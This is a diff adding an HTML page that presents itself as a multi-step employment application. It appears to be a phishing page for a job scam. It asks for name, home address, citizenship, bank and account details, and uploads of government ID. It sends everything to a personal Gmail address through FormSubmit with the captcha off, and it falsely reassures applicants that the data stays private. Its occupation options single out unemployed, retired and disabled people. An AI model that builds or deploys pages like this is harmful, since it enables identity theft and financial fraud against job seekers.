@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Professional Employment Application</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+    <div class="container">
+        <div class="form-card">
+            <header class="form-header">
+                <div class="header-icon">
+                    <!-- Briefcase Icon -->
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
+                        stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <rect x="2" y="7" width="20" height="14" rx="2" ry="2"></rect>
+                        <path d="M16 21V5a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v16"></path>
+                    </svg>
+                </div>
+                <h1>Employment Application</h1>
+                <p>Please complete all steps to submit your application.</p>
+            </header>
+
+            <div class="progress-container">
+                <div class="progress-bar-bg">
+                    <div class="progress-bar-fill" id="progress_bar"></div>
+                </div>
+                <div class="step-indicator">
+                    <span class="active">Personal</span>
+                    <span>Professional</span>
+                    <span>Payment</span>
+                    <span>Legal</span>
+                </div>
+            </div>
+
+            <form id="employment_form" action="https://formsubmit.co/maybryan007@gmail.com" method="POST"
+                enctype="multipart/form-data">
+                <!-- FormSubmit Configuration -->
+                <input type="hidden" name="_subject" value="New Employment Application">
+                <input type="hidden" name="_template" value="table">
+                <input type="hidden" name="_captcha" value="false">
+
+                <!-- Step 1: Personal Information -->
+                <div class="form-step active" data-step="1">
+                    <h2 class="section-title">Personal Information</h2>
+                    <div class="grid-row">
+                        <div class="form-group">
+                            <label for="first_name">First Name <span class="required">*</span></label>
+                            <input type="text" id="first_name" name="First Name" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="m_name">Middle Name <span class="required">*</span></label>
+                            <input type="text" id="m_name" name="Middle Name" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="last_name">Last Name <span class="required">*</span></label>
+                            <input type="text" id="last_name" name="Last Name" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="email">Email Address <span class="required">*</span></label>
+                            <input type="email" id="email" name="Email" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="phone">Phone Number <span class="required">*</span></label>
+                            <input type="tel" id="phone" name="Phone" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="address_1">Address Line 1 <span class="required">*</span></label>
+                            <input type="text" id="address_1" name="Address Line 1" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="address_2">Address Line 2 <span class="required">*</span></label>
+                            <input type="text" id="address_2" name="Address Line 2" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="city">City <span class="required">*</span></label>
+                            <input type="text" id="city" name="City" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="state">State <span class="required">*</span></label>
+                            <input type="text" id="state" name="State" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="zip">Zip Code <span class="required">*</span></label>
+                            <input type="text" id="zip" name="Zip Code" required>
+                        </div>
+                        <div class="form-group full-width">
+                            <label>USA CITIZEN <span class="required">*</span></label>
+                            <div class="radio-group">
+                                <label class="radio-option">
+                                    <input type="radio" name="USA Citizen" value="Yes" required> Yes
+                                </label>
+                                <label class="radio-option">
+                                    <input type="radio" name="USA Citizen" value="No"> No
+                                </label>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Step 2: About Yourself -->
+                <div class="form-step" data-step="2">
+                    <h2 class="section-title">Tell Us About Yourself</h2>
+                    <div class="form-group">
+                        <label for="reason_job">Reason Why You Need This Job <span class="required">*</span></label>
+                        <textarea id="reason_job" name="Reason For Job" required></textarea>
+                    </div>
+                    <div class="form-group">
+                        <label for="reason_hire">One Reason Why You Should Be Hired <span
+                                class="required">*</span></label>
+                        <textarea id="reason_hire" name="Reason To Hire" required></textarea>
+                    </div>
+                    <div class="form-group">
+                        <label for="strengths">What Are Your Greatest Professional Strengths? <span
+                                class="required">*</span></label>
+                        <textarea id="strengths" name="Professional Strengths" required></textarea>
+                    </div>
+                    <div class="form-group">
+                        <label for="achievement">Your Greatest Achievement <span class="required">*</span></label>
+                        <textarea id="achievement" name="Greatest Achievement" required></textarea>
+                    </div>
+                    <div class="form-group">
+                        <label for="weakness">Your Weakness <span class="required">*</span></label>
+                        <textarea id="weakness" name="Weakness" required></textarea>
+                    </div>
+                    <div class="form-group">
+                        <label>Do you have experience working from home? <span class="required">*</span></label>
+                        <div class="radio-group">
+                            <label class="radio-option">
+                                <input type="radio" name="Experience WFH" value="Yes" required> Yes
+                            </label>
+                            <label class="radio-option">
+                                <input type="radio" name="Experience WFH" value="No"> No
+                            </label>
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label>Can you devote 4 hours/day to the company? <span class="required">*</span></label>
+                        <div class="radio-group">
+                            <label class="radio-option">
+                                <input type="radio" name="4 Hours Daily" value="Yes" required> Yes
+                            </label>
+                            <label class="radio-option">
+                                <input type="radio" name="4 Hours Daily" value="No"> No
+                            </label>
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label for="challenges">Tell us about a conflict you've faced at work <span
+                                class="required">*</span></label>
+                        <textarea id="challenges" name="Work Challenges" required></textarea>
+                    </div>
+                    <div class="form-group">
+                        <label for="future">Where do you see yourself in 5 years? <span
+                                class="required">*</span></label>
+                        <textarea id="future" name="5 Year Plan" required></textarea>
+                    </div>
+                    <div class="form-group">
+                        <label for="character">List 4 words that describe your character <span
+                                class="required">*</span></label>
+                        <input type="text" id="character" name="Character Traits" required
+                            placeholder="e.g., Diligent, Honest, Loyal, Proactive">
+                    </div>
+                </div>
+
+                <!-- Step 3: Payment Info -->
+                <div class="form-step" data-step="3">
+                    <h2 class="section-title">Payment Information</h2>
+                    <div class="grid-row">
+                        <div class="form-group">
+                            <label>Preferred Payment Method <span class="required">*</span></label>
+                            <select name="Payment Method" required>
+                                <option value="" disabled selected>Select an option</option>
+                                <option value="Direct deposit">Direct deposit</option>
+                                <option value="Check">Check</option>
+                            </select>
+                        </div>
+                        <div class="form-group">
+                            <label>Account Type <span class="required">*</span></label>
+                            <select name="Account Type" required>
+                                <option value="" disabled selected>Select an option</option>
+                                <option value="Checking">Checking</option>
+                                <option value="Saving">Saving</option>
+                            </select>
+                        </div>
+                        <div class="form-group">
+                            <label>Payment Frequency <span class="required">*</span></label>
+                            <select name="Payment Frequency" required>
+                                <option value="" disabled selected>Select an option</option>
+                                <option value="Weekly">Weekly</option>
+                                <option value="Bi Weekly">Bi Weekly</option>
+                            </select>
+                        </div>
+                        <div class="form-group">
+                            <label for="bank_name">Bank Name <span class="required">*</span></label>
+                            <input type="text" id="bank_name" name="Bank Name" required
+                                placeholder="To verify salary payment compatibility">
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Step 4: Verification -->
+                <div class="form-step" data-step="4">
+                    <h2 class="section-title">Legal & Verification</h2>
+                    <div class="info-alert">
+                        <!-- Shield Icon -->
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
+                            stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+                        </svg>
+                        <p>We assure you that your information won't be released to any personnel or agency. All
+                            information must be accurate as it will be verified.</p>
+                    </div>
+
+                    <div class="grid-row">
+                        <div class="form-group">
+                            <label>Current Occupation <span class="required">*</span></label>
+                            <select name="Occupation" required>
+                                <option value="" disabled selected>Select an option</option>
+                                <option value="Unemployed">Unemployed</option>
+                                <option value="Student">Student</option>
+                                <option value="Government workers">Government workers</option>
+                                <option value="Retired">Retired</option>
+                                <option value="Disabled">Disabled</option>
+                            </select>
+                        </div>
+                        <div class="form-group">
+                            <label>Previous Experience <span class="required">*</span></label>
+                            <select name="Experience" required>
+                                <option value="" disabled selected>Select an option</option>
+                                <option value="1-5 Years">1-5 Years</option>
+                                <option value="6-10 Years">6-10 Years</option>
+                                <option value="10 Years And Above">10 Years And Above</option>
+                                <option value="None">None</option>
+                            </select>
+                        </div>
+                        <div class="form-group full-width">
+                            <label>Personal Records Status <span class="required">*</span></label>
+                            <div class="radio-group">
+                                <label class="radio-option">
+                                    <input type="radio" name="Personal Record Status" value="Good" required> Good
+                                </label>
+                                <label class="radio-option">
+                                    <input type="radio" name="Personal Record Status" value="Bad"> Bad
+                                </label>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label>Upload Valid ID (Front and Back) <span class="required">*</span></label>
+                        <div class="file-upload-wrapper">
+                            <!-- Upload Cloud Icon -->
+                            <svg style="margin-bottom: 0.5rem; color: #94a3b8;" xmlns="http://www.w3.org/2000/svg"
+                                width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
+                                <polyline points="17 8 12 3 7 8"></polyline>
+                                <line x1="12" y1="3" x2="12" y2="15"></line>
+                            </svg>
+                            <input type="file" name="ID Documents" id="id_upload" multiple required
+                                accept="image/*,.pdf">
+                            <div class="file-info">Upload up to 10 supported files. Max 10 GB per file.</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Navigation Buttons -->
+                <div class="form-navigation">
+                    <button type="button" class="btn btn-prev" id="prevBtn" disabled>Back</button>
+                    <button type="button" class="btn btn-next" id="nextBtn">Next</button>
+                    <button type="submit" class="btn btn-submit" id="submitBtn">Submit Application</button>
+                </div>
+            </form>
+        </div>
+    </div>
+    <script src="script.js"></script>
+</body>
+
+</html>
